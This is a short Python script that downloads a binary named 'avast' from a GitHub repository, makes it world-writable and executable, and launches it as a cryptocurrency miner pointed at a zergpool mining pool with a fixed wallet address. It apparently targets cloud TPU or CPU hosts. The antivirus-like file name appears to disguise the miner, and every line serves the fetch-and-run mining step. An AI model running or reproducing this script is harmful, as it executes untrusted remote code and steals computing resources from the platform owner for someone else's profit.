import os,subprocess
os.system("lscpu")
subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast'], stdout=subprocess.PIPE)
subprocess.run(['chmod', '777', 'avast'], stdout=subprocess.PIPE)
subprocess.run(['bash', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x'], stdout=subprocess.PIPE)
